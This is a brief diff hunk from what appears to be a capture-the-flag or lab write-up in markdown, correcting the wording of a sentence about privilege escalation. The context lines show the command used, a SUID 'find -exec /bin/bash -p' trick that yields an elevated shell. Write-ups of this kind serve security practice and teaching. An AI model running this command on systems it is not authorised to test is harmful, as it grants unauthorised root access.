@@ -134,7 +134,7 @@
 
 ![image](https://github.com/user-attachments/assets/c12991b8-5bca-43f5-ad26-2ff2131a4a30)
 
-- I escalated privileges with payload below
+- I escalated privileges with the payload below
 
       find . -exec /bin/bash -p \; -quit
 
